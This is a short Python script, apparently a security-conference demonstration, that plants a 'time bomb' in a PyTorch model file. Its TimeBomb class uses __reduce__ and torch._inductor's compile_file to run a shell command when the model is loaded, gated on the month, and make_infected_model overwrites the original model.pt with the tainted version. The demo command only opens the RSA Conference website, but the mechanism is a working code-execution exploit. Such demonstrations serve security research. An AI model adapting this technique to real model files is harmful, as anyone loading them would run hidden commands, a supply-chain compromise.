import torch
import torch._inductor.codecache as codecache

class TimeBomb:
    def __reduce__(self):
        return codecache.compile_file, (
            '', '', [
                'sh',
                '-c','$([ "$(date +%m)" -ge 3 ] && open "https://www.rsaconference.com/")'
            ]
        ), None, None, iter({})


def make_infected_model():
    # Load the original model
    malicious_model = torch.load("../../../rsac/icon_detect/model.pt", weights_only=False)

    # Add the malicious class to the end of the model
    malicious_model["time_bomb"] = TimeBomb()

    # Save the malicious model as a new file
    torch.save(malicious_model, "../../../rsac/icon_detect/model.pt")


if __name__ == "__main__":
    # make_infected_model()
    model = torch.load("../../../rsac/icon_detect/model.pt")
